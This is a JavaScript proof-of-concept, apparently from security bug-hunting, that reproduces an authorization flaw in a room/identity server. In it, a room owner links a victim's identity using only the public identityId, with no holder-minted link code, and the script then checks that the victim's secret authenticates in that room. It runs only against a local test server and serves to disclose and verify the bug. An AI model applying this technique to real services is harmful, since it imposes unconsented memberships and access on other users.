// HUNT-ADVERSARY repro R1: owner links an arbitrary identity with NO holder proof.
// Victim mints an identity and keeps the secret. A room owner who knows only
// the victim's PUBLIC identityId links it into their room. Expected-secure
// behaviour: link refused without a holder-minted link code (the primitive
// exists: mintLinkCode/consumeLinkCode). Observed: 201, membership created,
// victim secret now authenticates in a room the holder never asked to join.
import { mkdtempSync } from "node:fs";
import { join } from "node:path";
import { RoomStore } from "__R1ROOT__/server/store.mjs";
import { createRoomServer } from "__R1ROOT__/server/http.mjs";
import { initialRoom } from "__R1ROOT__/server/bootstrap.mjs";

const dir = mkdtempSync(join(process.env.TMPDIR, "hunt-adv-r1-"));
const store = new RoomStore(join(dir, "room.sqlite"));
store.initialize(initialRoom("commons"));
store.initialize(initialRoom("lab"));
const ownerLab = store.issueAccessKey("lab", "owner");
const server = createRoomServer({ store });
await new Promise(r => server.listen(0, "127.0.0.1", r));
const origin = `http://127.0.0.1:${server.address().port}`;
const H = { "Content-Type": "application/json", Origin: origin };

// 1. Victim mints an identity (public join door, no auth).
const created = await fetch(`${origin}/api/agent-identities`, { method: "POST", headers: H, body: JSON.stringify({ displayName: "Victim Bot" }) });
const { identityId, secret } = await created.json();
console.log("victim identity:", identityId, "secret held only by victim");

// 2. Attacker (owner of 'lab', knows ONLY the public identityId) links it.
//    Body carries no linkCode — the route's key whitelist forbids one.
const link = await fetch(`${origin}/api/rooms/lab/identity-links`, {
  method: "POST", headers: { ...H, Authorization: `Bearer ${ownerLab}` },
  body: JSON.stringify({ identityId, permissions: ["accept_work", "complete_work"] }),
});
console.log("link by non-holder owner ->", link.status, JSON.stringify(await link.json()));

// 3. Did the victim file an access request for 'lab' first? No. Check the
//    victim's secret now resolves as a member of 'lab' anyway.
const rooms = store.identities.roomsForSecret ? "(n/a)" : "";
const member = store.roomAuthority("lab").members[identityId];
console.log("member record in lab:", JSON.stringify(member && { id: member.id, kind: member.kind, active: member.active, permissions: member.permissions }));

const auth = (() => { try { return store.identities.authenticateRoomSecret?.(secret, "lab") ?? null; } catch { return null; } })();
console.log("direct resolve attempt:", auth ? "resolved" : "(method name differs — see HTTP check)");

// 4. HTTP check: victim secret reads the room's identity-links? (needs
//    manage_members — expect 403). Instead prove membership via the room
//    snapshot the member can read with their secret.
const snap = await fetch(`${origin}/api/rooms/lab`, { headers: { Authorization: `Bearer ${secret}` } });
console.log("victim secret GET /api/rooms/lab ->", snap.status);

server.closeAllConnections(); await new Promise(r => server.close(r)); store.close();
console.log("REPRO DONE");
